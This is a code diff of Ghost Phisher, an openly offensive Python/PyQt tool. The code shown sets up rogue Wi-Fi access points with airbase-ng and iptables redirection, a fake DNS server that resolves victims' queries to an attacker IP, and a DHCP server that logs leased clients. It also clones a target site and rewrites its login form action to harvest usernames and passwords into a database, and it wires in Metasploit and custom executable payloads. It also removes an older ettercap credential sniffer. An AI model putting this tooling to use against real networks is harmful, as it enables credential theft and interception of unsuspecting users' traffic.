+        self.connect(self.spawn_http_interface_combo,QtCore.SIGNAL("currentIndexChanged(QString)"),self.update_ghost_spawn_interfaces)
         self.connect(self.resolveall_radio,QtCore.SIGNAL("clicked()"),self.update_selection)
         self.connect(self.respond_domain_radio,QtCore.SIGNAL("clicked()"),self.update_selection)
         self.connect(self.dns_stop,QtCore.SIGNAL("clicked()"),self.stop_dns)
         self.connect(self.dns_start,QtCore.SIGNAL("clicked()"),self.launch_dns)
         self.connect(self.dhcp_start,QtCore.SIGNAL("clicked()"),self.launch_dhcp)
+        self.connect(self,QtCore.SIGNAL("new dhcp connection"),self.display_leases_client)
         self.connect(self.website_button,QtCore.SIGNAL("clicked()"),self.browse_webpage)
         self.connect(self.emulate_website_radio,QtCore.SIGNAL("clicked()"),self.set_usable)
         self.connect(self.select_website_radio,QtCore.SIGNAL("clicked()"),self.set_usable)
@@ -1268,8 +330,6 @@ class Ghost_phisher(QtGui.QMainWindow, Ui_ghost_phisher):            # Main clas
         self.connect(self,QtCore.SIGNAL("system interrupt"),self.dns_system_interrupt)
         self.connect(self,QtCore.SIGNAL("dns stopped"),self.stop_dns)
         self.connect(self,QtCore.SIGNAL("new client connection"),self.update_dns_connections)
-        self.connect(self,QtCore.SIGNAL('new credential'),self.new_credential)
-        self.connect(self,QtCore.SIGNAL('new remote host'),self.new_host)
         self.connect(self,QtCore.SIGNAL("run tips"),self.run_tips)
         self.connect(self,QtCore.SIGNAL("access point output"),self.update_access_output)
         self.connect(self,QtCore.SIGNAL("access point error"),self.update_access_error)
@@ -1278,11 +338,42 @@ class Ghost_phisher(QtGui.QMainWindow, Ui_ghost_phisher):            # Main clas
         self.connect(self.rouge_radio,QtCore.SIGNAL("clicked()"),self.clear_key_area)
         self.connect(self,QtCore.SIGNAL("triggered()"),QtCore.SLOT("close()"))
 
+        self.connect(self.ghost_vul_combo,QtCore.SIGNAL("clicked()"),self.vulnarabilty_page_choice)
+        self.connect(self.custom_vul_combo,QtCore.SIGNAL("clicked()"),self.vulnarabilty_page_choice)
+        self.connect(self.metasploit_payload_radio,QtCore.SIGNAL("clicked()"),self.metasploit_payload_choice)
+        self.connect(self.custom_payload_radio,QtCore.SIGNAL("clicked()"),self.custom_payload_choice)
+        self.connect(self.custom_page_button,QtCore.SIGNAL("clicked()"),self.browse_custom_webpage)
+        self.connect(self.windows_exec_button,QtCore.SIGNAL("clicked()"),self.custom_windows_executable_payload)
+        self.connect(self.linux_exec_button,QtCore.SIGNAL("clicked()"),self.custom_linux_executable_payload)
+
+        self.connect(self.ghost_spawn_start,QtCore.SIGNAL("clicked()"),self.launch_ghost_trap)
+        self.connect(self.ghost_spawn_stop,QtCore.SIGNAL("clicked()"),self.ghost_trap_stop)
+
+        self.connect(ghost_trap_http,QtCore.SIGNAL("got new connection"),self.display_new_connection)
+        self.connect(ghost_trap_http,QtCore.SIGNAL("new download"),self.new_download)
+
+        self.connect(self.update_function,QtCore.SIGNAL("new update available"),self.update_window)
+
+        # Start Update checker
+        thread.start_new_thread(self.update_function.update_initializtion_check,())
+
 
 
     #########################################################################
     #                           TIPS AND FONT SETTINGS                      #
     #########################################################################
+
+    def check_root_priviledges(self):
+        if(os.getenv('LOGNAME','none').lower() != 'root'):
+            QtGui.QMessageBox.warning(self,"Insufficient Priviledge","Ghost Phisher requires root priviledges to function properly,\
+            please run as root")
+            sys.exit(1)
+
+
+    def update_window(self):
+        self.update_function.display_update_version()
+        self.update_function.exec_()
+
 
     def keyPressEvent(self,event):
         '''Runs the font dialog window, when user
@@ -1290,6 +381,27 @@ class Ghost_phisher(QtGui.QMainWindow, Ui_ghost_phisher):            # Main clas
         if event.key() == QtCore.Qt.Key_F2:
             font_run = font_settings()
             font_run.exec_()
+
+        if event.key() == QtCore.Qt.Key_F3:     # Resize Ghost windows (netbook users)
+            if self.groupBox_16.isVisible() or self.groupBox_2.isVisible() or self.groupBox_5.isVisible() or self.groupBox_8.isVisible() or \
+            self.metasploit_settings_box.isVisible() or self.custom_payload_box.isVisible() or self.spawn_http_setting_box.isVisible():
+                self.groupBox_16.setVisible(False)
+                self.groupBox_2.setVisible(False)
+                self.groupBox_5.setVisible(False)
+                self.groupBox_8.setVisible(False)
+                self.metasploit_settings_box.setVisible(False)
+                self.custom_payload_box.setVisible(False)
+                self.spawn_http_setting_box.setVisible(False)
+                self.setFixedHeight(600)
+            else:
+                self.groupBox_16.setVisible(True)
+                self.groupBox_2.setVisible(True)
+                self.groupBox_5.setVisible(True)
+                self.groupBox_8.setVisible(True)
+                self.metasploit_settings_box.setVisible(True)
+                self.custom_payload_box.setVisible(True)
+                self.spawn_http_setting_box.setVisible(False)
+                self.setFixedHeight(685)
 
 
 
@@ -1309,11 +421,13 @@ class Ghost_phisher(QtGui.QMainWindow, Ui_ghost_phisher):            # Main clas
             on usage
         '''
         run_tips = tip_settings()
-        try:
-            if int(read_last_settings('tip-settings')) == 1:
+        if setting_file.setting_exists('tip-settings'):
+            if int(ghost_settings.read_last_settings('tip-settings')) == 1:
                 run_tips.exec_()
-        except IndexError:
+        else:
             run_tips.exec_()
+
+
 
 
     #########################################################################
@@ -1406,11 +520,11 @@ class Ghost_phisher(QtGui.QMainWindow, Ui_ghost_phisher):            # Main clas
         elif access_point_ip.count('.') < 3:
             access_point_control = 0
             QtGui.QMessageBox.warning(self,"Invalid IP address","Please input a valid IP address in the (Access Point Name:) section")
-        elif self.wpa_radio.isChecked() == True:
+        elif self.wpa_radio.isChecked():
             if encryption_key == '':
                 access_point_control = 0
                 QtGui.QMessageBox.warning(self,"NULL Encryption Key","Please input a key you intend to encrypt exchange information in on the Key text area e.g 1234567890")
-        elif self.wep_radio.isChecked() == True:
+        elif self.wep_radio.isChecked():
             if encryption_key == '':
                 access_point_control = 0
                 QtGui.QMessageBox.warning(self,"NULL Encryption Key","Please input a key you intend to encrypt exchange information in on the Key text area e.g 1234567890")
@@ -1462,8 +576,8 @@ class Ghost_phisher(QtGui.QMainWindow, Ui_ghost_phisher):            # Main clas
         self.main_mac_address_label.setText('Mac Address:<font color=green> %s</font>'%(mac_address))
         self.access_start.setEnabled(False)
         self.access_stop.setEnabled(True)
-        create_settings('self.access_name_edit',essid)
-        create_settings('ip_address_label_2',ip_address_text)
+        ghost_settings.create_settings('self.access_name_edit',essid)
+        ghost_settings.create_settings('ip_address_label_2',ip_address_text)
 
         # Gives Acess point connection client internet access
         filter_interface = ['Default Route Address','Loopback Address']
@@ -1563,9 +677,9 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 
         thread.start_new_thread(self.rougue_launch_phase,())
 
-        if self.rouge_radio.isChecked() == True:
+        if self.rouge_radio.isChecked():
             output = commands.getstatusoutput("airbase-ng -a %s -e '%s' -c %s %s > /tmp/access_point_log"%(mac_address,essid,channel,monitor))
-        elif self.wep_radio.isChecked() == True:
+        elif self.wep_radio.isChecked():
             output = commands.getstatusoutput("airbase-ng -a %s -e '%s' -c %s -w %s %s > /tmp/access_point_log"%(mac_address,essid,channel,key,monitor))
         else:
             output = commands.getstatusoutput("airbase-ng -a %s -z 2 -e '%s' -c %s -w %s %s > /tmp/access_point_log"%(mac_address,essid,channel,key,monitor))
@@ -1617,7 +731,7 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         ''' Disables un-used settings buttons if
             not selected
         '''
-        if self.resolveall_radio.isChecked() == True:
+        if self.resolveall_radio.isChecked():
             self.domain_add_button.setEnabled(False)
         else:
             self.domain_add_button.setEnabled(True)
@@ -1630,6 +744,8 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         self.label_5.setText("<font color=green>Runtime:</font> %s"%(time.ctime()))
         self.service_dns_run_label.setText("<font color=green>Service running on:</font> %s"%\
                                            (str(self.ip_address_combo.currentText())))
+        self.dns_textbrowser.append(" ")
+
 
     def update_dns_connections(self):
         global dns_connections
@@ -1640,10 +756,10 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
     def announce_client(self,client_hostname,address):
         global selected_dns_ip_address
         if len(address) > 2:
-            self.dns_textbrowser.append('<font color=green>%s just got our Fake IP address for %s</font>'%(client_hostname,address))
+            self.dns_textbrowser.append('<font color=blue>%s just got our Fake IP address for %s</font>'%(client_hostname,address))
         else:
             if str(client_hostname) != str(selected_dns_ip_address):
-                self.dns_textbrowser.append('<font color=green>%s just got our Fake IP address</font>'%(client_hostname))
+                self.dns_textbrowser.append('<font color=blue>%s just got our Fake IP address</font>'%(client_hostname))
 
 
 
@@ -1656,9 +772,8 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 
 
     def stop_dns(self):
-        global dns_contol
         global dns_connections
-        dns_contol = 1
+        self.dns_control = 1
         dns_connections = 0
         self.dns_start.setEnabled(True)
         self.dns_stop.setEnabled(False)
@@ -1669,8 +784,7 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 
 
     def dns_failed(self):
-        global dns_contol
-        dns_contol = 1
+        self.dns_control = 1
         self.dns_start.setEnabled(True)
         self.dns_stop.setEnabled(False)
         self.label_5.setText("<font color=green>Runtime:</font> Service not started")
@@ -1679,8 +793,8 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         thread.start_new_thread(self.break_last_loop_thread,())
 
     def dns_system_interrupt(self):
-        global dns_contol
-        dns_contol = 1
+
+        self.dns_control = 1
         self.dns_start.setEnabled(True)
         self.dns_stop.setEnabled(False)
         self.label_5.setText("<font color=green>Runtime:</font> Service not started")
@@ -1722,7 +836,7 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
             DNS_socket.bind((selected_dns_ip_address,53))
             self.emit(QtCore.SIGNAL("dns started"))
             while True:
-                if dns_contol == 0:
+                if self.dns_control == 0:
                     if alternate != None:
                         DNS_query = DNS_socket.recvfrom(1024)
                         for website in dns_ip_and_websites.keys():
@@ -1769,15 +883,16 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
             buttons
         '''
         global dns_ip_and_websites
-        global dns_contol
-        dns_contol = 0
+
+        self.dns_control = 0
         fake_dns_resolution_ip = ''                                             # holds the fake dns resolution ip address
-        if self.resolveall_radio.isChecked() == True:
+        if self.resolveall_radio.isChecked():
             if str(self.dns_ip_address.text()).count('.') != 3:                 #Check if ip address area is empty
                 QtGui.QMessageBox.warning(self,'Invalid Resolution IP Address','Please input a valid Fake IP address of which you want the dns to resolve client queries')
             else:
                 fake_dns_resolution_ip += str(self.dns_ip_address.text())
-                create_settings('self.dns_ip_address',fake_dns_resolution_ip)       # Write settings to last settings file
+                ghost_settings.create_settings('self.dns_ip_address',fake_dns_resolution_ip)       # Write settings to last settings file
+                self.dns_textbrowser.clear()
                 self.dns_textbrowser.append('<font color=green>Starting Fake DNS Server....')
                 self.dns_start.setEnabled(False)
                 self.dns_stop.setEnabled(True)
@@ -1785,6 +900,7 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         else:
             try:
                 dns_ip_and_websites.keys()[0]
+                self.dns_textbrowser.clear()
                 self.dns_textbrowser.append('<font color=green>Starting Fake DNS Server....')
                 self.dns_start.setEnabled(False)
                 self.dns_stop.setEnabled(True)
@@ -1826,6 +942,10 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 
         self.dhcp_start.setEnabled(True)
         self.dhcp_stop.setEnabled(False)
+
+        if os.path.exists("/var/lib/dhcp3/dhcpd.leases"):
+            os.remove("/var/lib/dhcp3/dhcpd.leases")
+
         #start-stop-daemon --stop --quiet --pidfile $DHCPDPID
         if os.path.exists(dhcp_pid_file):
             dhcp_pid = open(dhcp_pid_file).read().strip()
@@ -1852,6 +972,10 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         subnet_ip = str(self.subnet_ip.text())
         alternatedns_ip = str(self.alternatedns_ip.text())
 
+        lease_file = open("/var/lib/dhcp3/dhcpd.leases",'a+')
+        lease_file.close()
+        os.chmod("/var/lib/dhcp3/dhcpd.leases",0777)
+
         if dhcp_installation_status == 'not installed':
             self.dhcp_status.append('<font color=green>DHCP3 Server is not installed run:</font>\t<font color=red>"apt-get install dhcp3-server" to install</font>')
         elif start_ip.count('.') != 3:                                   # Check if inputed data is valid
@@ -1865,26 +989,26 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         elif alternatedns_ip.count('.') != 3:
             QtGui.QMessageBox.warning(self,"Invalid IP Address","Please input a valid IP address on the (Alternate  DNS IP :) section, is best you input a real DNS server IP address here to fasten HTTP responce on an intranet based networks")
         else:
-            create_settings('self.start_ip',start_ip)                   # Write settings to last_settings file
-            create_settings('self.stop_ip',stop_ip)
-            create_settings('self.fakedns_ip',fakedns_ip)
-            create_settings('self.gateway_ip',gateway_ip)
-            create_settings('self.subnet_ip',subnet_ip)
-            create_settings('self.alternatedns_ip',alternatedns_ip)
+            ghost_settings.create_settings('self.start_ip',start_ip)                   # Write settings to last_settings file
+            ghost_settings.create_settings('self.stop_ip',stop_ip)
+            ghost_settings.create_settings('self.fakedns_ip',fakedns_ip)
+            ghost_settings.create_settings('self.gateway_ip',gateway_ip)
+            ghost_settings.create_settings('self.subnet_ip',subnet_ip)
+            ghost_settings.create_settings('self.alternatedns_ip',alternatedns_ip)
 
-            #update:
+            # update:
             #   start dhcp server using a custom config file.
 
 
 
 
-            #if 'dhcpd.conf_original' in os.listdir('/etc/dhcp3/'):      # Remove dhcpd.conf file if ghost_phiser had earlierly created it to avoid using old settings
+            # if 'dhcpd.conf_original' in os.listdir('/etc/dhcp3/'):      # Remove dhcpd.conf file if ghost_phiser had earlierly created it to avoid using old settings
             #    if 'dhcpd.conf' in os.listdir('/etc/dhcp3'):
             #        os.remove('/etc/dhcp3/dhcpd.conf')
-            #else:
-            #    os.rename('/etc/dhcp3/dhcpd.conf','/etc/dhcp3/dhcpd.conf_original')     # Backup your original dhcp settings if they exist
-            #
-            #
+            # else:
+            #     os.rename('/etc/dhcp3/dhcpd.conf','/etc/dhcp3/dhcpd.conf_original')     # Backup your original dhcp settings if they exist
+
+
             if subnet_ip == '255.0.0.0':                                # Class A subnet and broadcast address
                 process = start_ip[0:start_ip.index('.')]
                 broadcast = process + '.255.255.255'
@@ -1937,12 +1061,63 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
             dhcp_status = commands.getstatusoutput(cmd)
 
             if dhcp_status[0] == 0:
+                self.dhcp_status.clear()
                 self.dhcp_status.append('<font color=green>%s at %s </font>'%(dhcp_status[1],time.ctime()))  # DHCP ran successfully
+                self.dhcp_status.append(" ")
+                thread.start_new_thread(self.check_leases_changes,())                                       # Periodically check lease file for changes
                 self.dhcp_start.setEnabled(False)
                 self.dhcp_stop.setEnabled(True)
             else:
+                self.dhcp_status.clear()
                 for dhcp_failure in dhcp_status[1].splitlines():
                     self.dhcp_status.append('<font color=red>%s</font>'%(dhcp_failure))  # DHCP did not run successfully
+
+
+    def check_leases_changes(self):
+        lease_length = int()
+        while not self.dhcp_start.isEnabled():
+            time.sleep(2)
+            lease_file = open('/var/lib/dhcp3/dhcpd.leases')
+            temp = lease_file.read()
+            if(int(temp.count("client-hostname")) != lease_length):
+                self.emit(QtCore.SIGNAL("new dhcp connection"))
+                lease_length += 1
+            lease_file.close()
+
+
+    def display_leases_client(self):
+        lease_file = open('/var/lib/dhcp3/dhcpd.leases')
+        string = lease_file.read()
+        regex = re.compile("(\d+\.\d+\.\d+\.\d+)")              # IP Address regular expression
+        regex_host = re.compile('client-hostname ("\S*")')      # Host name regular expression
+
+        client_address = regex.findall(string)
+        unique_address = list(set(client_address))
+        for address in unique_address:
+            location = string.index(str(address))
+            string_process = string[location:-1]
+            for process in string_process.splitlines():
+                if regex_host.search(process):
+                    self.lease_process(regex_host.findall(process)[0],address)
+                    break
+
+        lease_file.close()
+
+
+    def lease_process(self,host_name,address):
+        if not self.dhcp_cache.has_key(host_name):
+            self.dhcp_cache[host_name] = address
+            self.dhcp_status.append('<font color=blue>' + host_name + ' has been leased ' + address + '</font>')
+        else:
+            if self.dhcp_cache[host_name] != address:
+                self.dhcp_cache[host_name] = address
+                self.dhcp_status.append('<font color=blue>' + host_name + " has been leased " + address + '</font>')
+
+
+
+
+
+
 
 
 
@@ -1964,34 +1139,14 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
             if os.path.isdir(cwd + '/HTTP-Webscript/' + file_):
                 html_folder += file_
 
-        if bool(html_folder) == False:
+        if not bool(html_folder):
             html_folder = 'Null'
 
-        http_terminal = subprocess.Popen('python %s %d %s %s'%\
-                                (cwd+'/core/http_core.py',http_server_port,
-                                html_folder,cwd),shell=True,stdout=subprocess.PIPE,
-                                stdin=subprocess.PIPE)   # python http_core.py '0.0.0.0' '80' 'index_files'
-
-
-    def new_connection(self):
-        '''Detects changes to log file and emits signal'''
-        global http_control
-        connection_index = int()        # connection_index = 0
-        while http_control == 0:
-            time.sleep(3)
-            log_file = open('/tmp/response.log')
-            log_read = log_file.read()
-            log_file.close()
-            if connection_index != len(log_read.splitlines()):
-                self.emit(QtCore.SIGNAL('new remote host'))
-                connection_index += 1
-
-
-    def new_host(self):
-        '''Displays connection details to http text browser'''
-        log_file = open('/tmp/response.log')
-        host_details = log_file.read().splitlines()
-        self.status_textbrowser_http.append('<font color=blue>%s</font>'%(host_details[-1]))
+        self.fake_http_object = GhostHTTPServer('0.0.0.0',http_server_port,html_folder,cwd,self.form_variables[0],self.form_variables[1]) # Username/Password varaible are from the form pages
+        self.connect(self.fake_http_object,QtCore.SIGNAL("new credential"),self.new_credential)
+        self.connect(self.fake_http_object,QtCore.SIGNAL("new remote host"),self.new_host)
+        os.environ["ghost_fake_http_control"] = "start"           # Control the fake http process from API (True == Start Server)
+        self.fake_http_object.start()
 
 
 
@@ -2002,45 +1157,19 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         global http_address                 # Holds the address where Fake HTTP server is running e.g http://192.168.0.1/
         http_control = 1
         self.http_start.setEnabled(True)
-        try:
-            commands.getstatusoutput('kill -9 %s'%(http_terminal.pid))               # Kill GhostHTTPServer's subprocess
-            commands.getstatusoutput('killall ettercap')
-        except IOError:pass
+        self.fake_http_object.quit()        # Kill fake HTTP Server
         self.http_stop.setEnabled(False)
-
+        os.environ["ghost_fake_http_control"] = "stop"           # Control the fake http process from API (False == Stop Server)
         self.status_textbrowser_http.append('<font color=red>HTTP Server Stopped at: %s</font>'%(time.ctime()))
         self.http_ip_label.setText('<font color=green>Service running on:</font>  Service not started')
         self.label_13.setText('<font color=green>Runtime:</font>  Service not started')
 
 
 
-    def sniff_thread(self):
-        ''' Thread launches ettercap as the sniffing
-            engine
-        '''
-        global http_control
 
-        interface = str(self.http_interface_combo.currentText())    # Http interface card
-        if interface == 'Loopback Address':
-            sniff_interface = 'lo'
-        else:
-            sniff_interface = interface
-
-        pipe = subprocess.Popen('ettercap -i %s -T -q'%(sniff_interface),shell=True,stdout= subprocess.PIPE)
-        sniff_output = pipe.stdout
-        while http_control != 1:
-            capture = str(sniff_output.readline())
-            if 'HTTP' in capture:
-                credential_process = capture.split()
-                username = credential_process[5]
-                password = credential_process[7]
-                if str(self.lineEdit_2.text()) == '':
-                    website = credential_process[-1]
-                else:
-                    website = str(self.lineEdit_2.text())
-                if 'PASS:' != username:                     # Basic filter
-                    self.database_commit(website,username,password)
-                    self.emit(QtCore.SIGNAL('new credential'))
+    def new_host(self):
+        '''logs remote host details'''
+        self.status_textbrowser_http.append('<font color=blue>' + self.fake_http_object.remote_connection + '</font>')
 
 
 
@@ -2049,6 +1178,12 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
             quering from database file
         '''
         global captured_credential
+
+        raw_website = str(self.lineEdit_2.text())
+        raw_username = str(self.fake_http_object.credentials[0])
+        raw_password = str(self.fake_http_object.credentials[1])
+
+        self.database_commit(raw_website,raw_username,raw_password)
 
         database_items = self.fetch_data()
         items = str(database_items).count('u')
@@ -2081,9 +1216,14 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         ''' Disables un-used settings buttons if
             not selected
         '''
-        if self.emulate_website_radio.isChecked() == True:
+        if self.emulate_website_radio.isChecked():
             self.website_button.setEnabled(False)
-            self.emulate_website_label.setText('http://')
+            try:
+                self.emulate_website_label.setPlaceholderText("http:// or https://")
+            except:
+                self.emulate_website_label.setText("http:// or https://")
+                self.emulate_website_label.selectAll()
+                self.emulate_website_label.setFocus()
             self.website_linedit.clear()
 
         else:
@@ -2119,9 +1259,10 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         webpage = QtGui.QFileDialog.getOpenFileName(self,"Select Webpage","","HTML Scripts(*.html *.htm)")
         if webpage != '':
             self.website_linedit.setText(webpage)
-            create_settings('self.website_linedit',webpage)
+            ghost_settings.create_settings('self.website_linedit',webpage)
 
-        commands.getstatusoutput('rm -r ' + cwd + os.sep + 'HTTP-Webscript')
+        if os.path.exists(cwd + '/HTTP-Webscript'):
+            shutil.rmtree(cwd + os.sep + 'HTTP-Webscript')
 
 
 
@@ -2131,7 +1272,7 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         '''
         self.status_textbrowser_http.clear()
 
-        if self.capture_radio.isChecked() == True:                          # Capture Mode is enabled
+        if self.capture_radio.isChecked():                          # Capture Mode is enabled
             if len(str(self.lineEdit_2.text())) < 3:
                 QtGui.QMessageBox.warning(self,'Invalid URL or IP address','Please input the original url or ip address of the spoofed website')
             else:
@@ -2150,14 +1291,14 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 
         actions_ip_address = str(self.http_ip_combo.currentText())
 
-        if self.run_webpage_port_radio.isChecked() == True:     # Check if http port section has been changed
+        if self.run_webpage_port_radio.isChecked():     # Check if http port section has been changed
             try:
                 http_server_port = int(self.use_port_http.text())
             except ValueError:
                 QtGui.QMessageBox.warning(self,"Invalid Port Number","Please input a valid port number on the (Run Webpage on Port :) section")
 
-        if 'HTTP-Webscript' in os.listdir(cwd):     # Create web directory if it does not exist
-            commands.getstatusoutput('rm -r ' + cwd + '/HTTP-Webscript')
+        if os.path.exists(cwd + '/HTTP-Webscript'):     # Create web directory if it does not exist
+            shutil.rmtree(cwd + '/HTTP-Webscript')
         os.mkdir(cwd + '/HTTP-Webscript')
 
         if 'Ghost-Phisher-Database' not in os.listdir(cwd): # Create Database directory
@@ -2165,47 +1306,42 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 
 
 
-        if self.select_website_radio.isChecked() == True:
+        if self.select_website_radio.isChecked():
+
             web_script = str(self.website_linedit.text())
-            if web_script == '':
+            webserver_path = cwd + os.sep + 'HTTP-Webscript' + os.sep
+
+            if not web_script:
                 http_error += 1
                 QtGui.QMessageBox.warning(self,"Invalid Web-Script","Please browse and select a web-script to host from the (Select Webpage:) section")
             else:
                 self.status_textbrowser_http.append('<font color=green>Starting HTTP Server...</font>')
 
-                html_process = web_script.replace(os.sep,'\n')      # This section moves the Web script and its files to the HTTP Webscript directory
-                html_file = html_process.splitlines()[-1]           # Holds file name like (index.html)
+                html_file = web_script.split('/')[-1]           # Holds file name like (index.html)
+                html_name = re.findall("(\S*)\.",html_file)[0]            # Holds variable like (index)
+                folder_path = web_script.replace(html_file,"")
 
-                html_name_process = html_file.replace('.','\n').splitlines()
-                html_name = html_name_process[0]
+                html_folder = ""                           # Holds folder name like (index_files)
 
-                html_file_folder = ''                               # Holds folder name like (index_files)
-
-                for files in os.listdir(web_script.replace(html_file,'')):  # Iterates over the directory where html file is situated
-                    if html_name in files:
-                        if files != html_file:
-                            html_file_folder += files
-
-                if html_name in html_file_folder:
-                    html_file_folder_path = web_script.replace(html_file,html_file_folder)
+                if os.path.exists(folder_path + html_name + "_files"):
+                    html_folder = str(html_name + "_files")
+                    html_file_folder = folder_path + html_name + "_files"
+                elif os.path.exists(folder_path + html_name + "_FILES"):
+                    html_folder = str(html_name + "_FILES")
+                    html_file_folder = folder_path + html_name + "_FILES"   # html_file_folder = /root/Desktop/index_files
                 else:
-                    html_file_folder_path = ''
+                    html_folder = None
+                    html_file_folder = None
 
-                webserver_path = cwd + os.sep + 'HTTP-Webscript' + os.sep
+                shutil.copyfile(web_script,webserver_path + html_file)
 
-                response = commands.getstatusoutput('cp -r %s %s \n cp -r %s %s'%(web_script,webserver_path,\
-                                                                              html_file_folder_path,webserver_path))
+                if html_file_folder:
+                    shutil.copytree(html_file_folder,webserver_path + html_folder)
 
                 try:
                     os.rename('%s/HTTP-Webscript/%s'%(cwd,html_file),'%s/HTTP-Webscript/index.html'%(cwd))               # rename our webscript to what the web server can host
-                    if response[0] != 0:
-                        if html_file_folder == '':
-                            self.status_textbrowser_http.append('<font color=green>Moving webscript files to Web-Server directory...</font>')
-                        else:
-                            self.status_textbrowser_http.append('<font color=red>Failed to move webscript files to Web-Server directory: %s</font>'%(response[1]))
-                            http_error += 1
-                    else:
-                        self.status_textbrowser_http.append('<font color=green>Moving webcript files to Web-Server directory...</font>')
+
+                    self.status_textbrowser_http.append('<font color=green>Moving webscript files to Web-Server directory...</font>')
 
                 except OSError,e:
                     self.status_textbrowser_http.append('<font color=red>Unable to start HTTP Server: %s</font>'%(e))
@@ -2215,7 +1351,8 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
             website_url = str(self.emulate_website_label.text())
             if len(website_url) > 7:
                 self.status_textbrowser_http.append('<font color=green>Starting HTTP Server...</font>')
-                commands.getstatusoutput('rm -r ' + cwd + os.sep + 'HTTP-Webscript') # Remove old html files already there
+                if os.path.exists(cwd + '/HTTP-Webscript'):
+                    shutil.rmtree(cwd + os.sep + 'HTTP-Webscript') # Remove old html files already there
                 os.mkdir(cwd + '/HTTP-Webscript')
                 try:
                     url_source = urllib2.urlopen(website_url)                    # Get the source code of the website and write an HTML file of the website
@@ -2233,7 +1370,7 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
             #
             os.chmod('%s/Ghost-Phisher-Database'%(cwd),0777)
 
-        if dns_contol == 0:
+        if self.dns_control == 0:
             if http_server_port == 80:
                 http_address = 'http://%s/'%(str(self.lineEdit_2.text()))  # If DNS is activated then give e.g http://www.foo-bar/ instead of http://192.168.0.23/
             else:
@@ -2249,27 +1386,33 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         html_file = open('%s/HTTP-Webscript/index.html'%(cwd))
         html_source = html_file.read()
 
-        if self.capture_radio.isChecked() == True:                          # Capture Mode is enabled
+        if self.capture_radio.isChecked():                                                      # Capture Mode is enabled
+            form_login_variables = []
 
-            locate_form_action = html_source.find('action')
-            index_forms_end = html_source[locate_form_action:-1]
-            index_form_length = index_forms_end.find('>')
+            regex_post = re.compile('<label\s*for\S*">',re.IGNORECASE)
+            regex_post_process = re.compile('name="(\S*)"',re.IGNORECASE)
+            regex = re.compile("action\S*|action\s*=\s*\S*",re.IGNORECASE)                      # Matches any html "action" variable
 
-            action_string = index_forms_end[0:index_form_length]
+            new_post_action = regex.sub('action="/login.php"',html_source)          # Replaces action variable with ours e.g <action="http://192.168.0.23/login.php">
 
-            new_post_action = html_source.replace(action_string,'action="/login.php"') # Replaces action variable with ours e.g <action="http://192.168.0.23/login.php">
-            create_settings('self.lineEdit_2',str(self.lineEdit_2.text()))
+            for forms in enumerate(regex_post.findall(new_post_action)):
+                pos = new_post_action.index(forms[1])
+                new_string = new_post_action[pos:-1]
+
+                for login_form in regex_post_process.findall(new_string):
+                    form_login_variables.append(login_form)
+
+            self.form_variables = form_login_variables       # Store to database, website form variables e.g ['email','pass']
+            ghost_settings.create_settings('self.lineEdit_2',str(self.lineEdit_2.text()))
             #
             # Check if html source has a valid Post action method
             #
-
             os.remove('%s/HTTP-Webscript/index.html'%(cwd))                     # Remove index script
             new_html_file = open('%s/HTTP-Webscript/index.html'%(cwd),'a+')     # Rewrite to incude our new action url
             new_html_file.write(new_post_action)
             new_html_file.close()
 
-            self.status_textbrowser_http.append('<font color=green>Sniffing http port for possible login packets')
-            thread.start_new_thread(self.sniff_thread,())                       # HTTP credential Sniffing thread
+            self.status_textbrowser_http.append('<font color=green>Scanning packets for possible login details')
 
 
         else:                                                              # Hosting Mode is enabled
@@ -2288,17 +1431,13 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
             if os.path.exists('/tmp/original.html'):                    # Delete original source if it already exist in the tmp directory
                 os.remove('/tmp/original.html')
 
-            if os.path.exists('/tmp/response.log'):
-                os.remove('/tmp/response.log')
-            os.open('/tmp/response.log',0777)                                # Open file for remote host logging
-
             original_source = open('/tmp/original.html','a+')
             original_source.write(html_source)
             original_source.close()
 
+################# HERERERERERERER######################################################################
             thread.start_new_thread(self.HTTP_initialization,())        # Start HTTP Sever thread
 
-            thread.start_new_thread(self.new_connection,())
 
             if http_server_port == 80:
                 http_address = 'http://%s/'%(actions_ip_address)
@@ -2380,12 +1519,397 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
                 self.database_commit(website.text(),username.text(),password.text())        # Save data to database
             except TypeError:
                 QtGui.QMessageBox.warning(self,'Null Field Detected','Please remove white spaces or rows with empty data')
+
         try:
             os.chmod('%s/Ghost-Phisher-Database/database.db'%(cwd),0777)
         except OSError:
             pass
 
 
+
